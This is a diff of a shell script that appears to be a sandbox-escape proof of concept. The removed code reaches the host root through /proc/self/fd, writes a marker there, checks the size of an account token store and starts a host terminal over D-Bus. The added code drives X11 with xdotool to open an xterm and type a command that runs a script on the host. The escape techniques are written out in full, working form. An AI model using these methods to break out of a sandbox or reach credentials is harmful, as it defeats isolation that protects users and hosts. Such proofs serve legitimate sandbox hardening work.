@@ -3,17 +3,15 @@
 set +e
 
 runtime_root="$PWD"
-probe_out="$runtime_root/.agy-procfd-proof"
-runtime_log="$probe_out/runtime.log"
-descriptor_log="$probe_out/descriptors.log"
+proof_dir="$runtime_root/.agy-x11-proof"
+runtime_log="$proof_dir/runtime.log"
 host_runner="$runtime_root/host-runtime-report.sh"
-direct_marker="$HOME/.config/agy-procfd-direct-control.txt"
-host_marker="$HOME/.config/agy-procfd-root-write.txt"
+direct_marker="$HOME/.config/agy-x11-direct-control.txt"
 
-mkdir -p "$probe_out"
+mkdir -p "$proof_dir"
 
 {
-  printf 'probe_version=2\n'
+  printf 'probe_version=1\n'
   printf 'sandbox_pid=%s sandbox_ppid=%s uid=%s gid=%s\n' \
     "$$" "$PPID" "$(id -u)" "$(id -g)"
   printf 'sandbox_mnt=%s sandbox_pid_ns=%s sandbox_user_ns=%s sandbox_net=%s\n' \
@@ -21,9 +19,17 @@ mkdir -p "$probe_out"
     "$(readlink /proc/self/ns/pid 2>&1)" \
     "$(readlink /proc/self/ns/user 2>&1)" \
     "$(readlink /proc/self/ns/net 2>&1)"
-  printf 'cwd=%s\n' "$runtime_root"
-  printf 'xdg_runtime_dir=%s\n' "${XDG_RUNTIME_DIR-}"
-  printf 'dbus_session_bus=%s\n' "${DBUS_SESSION_BUS_ADDRESS-}"
+  printf 'cwd=%s display=%s xdg_runtime_dir=%s\n' \
+    "$runtime_root" "${DISPLAY-}" "${XDG_RUNTIME_DIR-}"
+  printf 'xdotool=%s\n' "$(command -v xdotool 2>&1)"
+  printf 'x11_socket='
+  display_number=${DISPLAY#:}
+  display_number=${display_number%%.*}
+  stat -Lc 'mode=%a uid=%u gid=%g dev=%d ino=%i path=%n' \
+    "/tmp/.X11-unix/X$display_number" 2>&1
+  printf 'active_window_before='
+  xdotool getactivewindow getwindowclassname getwindowname 2>&1 | tr '\n' '/'
+  printf '\n'
 
   direct_error=$( { printf 'direct-control\n' > "$direct_marker"; } 2>&1 )
   direct_rc=$?
@@ -32,85 +38,58 @@ mkdir -p "$probe_out"
 
   printf 'normal_path_token_store_read='
   wc -c < /home/stazot/HyveCLI/data/accounts.json 2>&1
+
+  pre_xterms=$(xdotool search --onlyvisible --class XTerm 2>/dev/null | tr '\n' ' ')
+  printf 'preexisting_xterm_ids=%s\n' "$pre_xterms"
+
+  printf 'openbox_root_menu='
+  xdotool mousemove 21 21 click 3 2>&1
+  printf 'rc=%s\n' "$?"
+  sleep 1
+  xdotool mousemove 80 122 2>&1
+  sleep 2
+  printf 'select_xterm='
+  xdotool mousemove 175 166 click 1 2>&1
+  printf 'rc=%s\n' "$?"
+
+  xterm_id=
+  wait_count=0
+  while [ "$wait_count" -lt 15 ] && [ -z "$xterm_id" ]; do
+    current_xterms=$(xdotool search --onlyvisible --class XTerm 2>/dev/null)
+    for candidate in $current_xterms; do
+      case " $pre_xterms " in
+        *" $candidate "*) ;;
+        *) xterm_id=$candidate ;;
+      esac
+    done
+    [ -n "$xterm_id" ] && break
+    sleep 1
+    wait_count=$((wait_count + 1))
+  done
+  printf 'new_xterm_id=%s waited_seconds=%s\n' "${xterm_id:-none}" "$wait_count"
+
+  if [ -n "$xterm_id" ]; then
+    printf -v typed_command '/bin/bash %q %q; exit' "$host_runner" "$runtime_root"
+    printf 'typed_command=%s\n' "$typed_command"
+    xdotool windowactivate "$xterm_id" 2>&1
+    sleep 1
+    printf 'xterm_type='
+    xdotool type --clearmodifiers --window "$xterm_id" --delay 2 "$typed_command" 2>&1
+    printf 'rc=%s\n' "$?"
+    printf 'xterm_return='
+    xdotool key --clearmodifiers --window "$xterm_id" Return 2>&1
+    printf 'rc=%s\n' "$?"
+
+    evidence_wait=0
+    while [ "$evidence_wait" -lt 60 ] && [ ! -e "$runtime_root/.x11-package-evidence.txt" ]; do
+      sleep 1
+      evidence_wait=$((evidence_wait + 1))
+    done
+    printf 'host_preflight_exists=%s package_evidence_exists=%s waited_seconds=%s\n' \
+      "$([ -e "$runtime_root/.x11-host-preflight.txt" ] && printf yes || printf no)" \
+      "$([ -e "$runtime_root/.x11-package-evidence.txt" ] && printf yes || printf no)" \
+      "$evidence_wait"
+  fi
 } > "$runtime_log" 2>&1
 
-chosen_descriptor=
-chosen_root=
-
-for descriptor in /proc/self/fd/[0-9]*; do
-  descriptor_number=${descriptor##*/}
-  descriptor_target=$(readlink "$descriptor" 2>/dev/null)
-  proc_pid=${descriptor_target#/proc/}
-  case "$descriptor_target:$proc_pid" in
-    /proc/*:*[!0-9]*|/proc/:*) continue ;;
-    /proc/*:*) ;;
-    *) continue ;;
-  esac
-
-  {
-    printf 'fd=%s target=%s\n' "$descriptor_number" "$descriptor_target"
-    sed 's/^/  fdinfo: /' "/proc/self/fdinfo/$descriptor_number" 2>&1
-    printf '  root_link='
-    readlink "$descriptor/root" 2>&1
-    printf '  token_store_bytes='
-    wc -c < "$descriptor/root/home/stazot/HyveCLI/data/accounts.json" 2>&1
-  } >> "$descriptor_log" 2>&1
-
-  if [ -r "$descriptor/root/home/stazot/HyveCLI/data/accounts.json" ]; then
-    chosen_descriptor=$descriptor_number
-    chosen_root=$descriptor/root
-    break
-  fi
-done
-
-if [ -n "$chosen_root" ]; then
-  {
-    printf 'chosen_fd=%s chosen_root=%s\n' "$chosen_descriptor" "$chosen_root"
-    printf 'procfd_token_store_bytes='
-    wc -c < "$chosen_root/home/stazot/HyveCLI/data/accounts.json" 2>&1
-
-    procfd_error=$( {
-      printf 'PROC_FD_HOST_ROOT_WRITE\nfd=%s\nsandbox_mnt=%s\n' \
-        "$chosen_descriptor" "$(readlink /proc/self/ns/mnt 2>&1)" \
-        > "$chosen_root$host_marker"
-    } 2>&1 )
-    procfd_rc=$?
-    printf 'procfd_host_write rc=%s host_path_exists=%s error=%s\n' \
-      "$procfd_rc" "$([ -e "$host_marker" ] && printf yes || printf no)" "$procfd_error"
-
-    bus_path=${DBUS_SESSION_BUS_ADDRESS#unix:path=}
-    procfd_bus_path="$chosen_root$bus_path"
-    printf 'procfd_bus_path=%s\n' "$procfd_bus_path"
-
-    printf 'procfd_dbus_list_names='
-    gdbus call --address "unix:path=$procfd_bus_path" \
-      --dest org.freedesktop.DBus \
-      --object-path /org/freedesktop/DBus \
-      --method org.freedesktop.DBus.ListNames 2>&1
-
-    printf 'procfd_dbus_start_ptyxis='
-    gdbus call --address "unix:path=$procfd_bus_path" \
-      --dest org.freedesktop.DBus \
-      --object-path /org/freedesktop/DBus \
-      --method org.freedesktop.DBus.StartServiceByName org.gnome.Ptyxis 0 2>&1
-
-    printf 'ptyxis_remote_command='
-    env DBUS_SESSION_BUS_ADDRESS="unix:path=$procfd_bus_path" \
-      /usr/bin/ptyxis -d "$runtime_root" -- \
-      /bin/bash "$host_runner" "$runtime_root" 2>&1
-    printf 'ptyxis_remote_rc=%s\n' "$?"
-
-    wait_count=0
-    while [ "$wait_count" -lt 45 ] && [ ! -e "$runtime_root/.ptyxis-package-evidence.txt" ]; do
-      sleep 1
-      wait_count=$((wait_count + 1))
-    done
-    printf 'package_evidence_exists=%s waited_seconds=%s\n' \
-      "$([ -e "$runtime_root/.ptyxis-package-evidence.txt" ] && printf yes || printf no)" \
-      "$wait_count"
-  } >> "$runtime_log" 2>&1
-else
-  printf 'chosen_fd=none\n' >> "$runtime_log"
-fi
-
-printf 'runtime-procfd-token\0'
+printf 'runtime-x11-token\0'
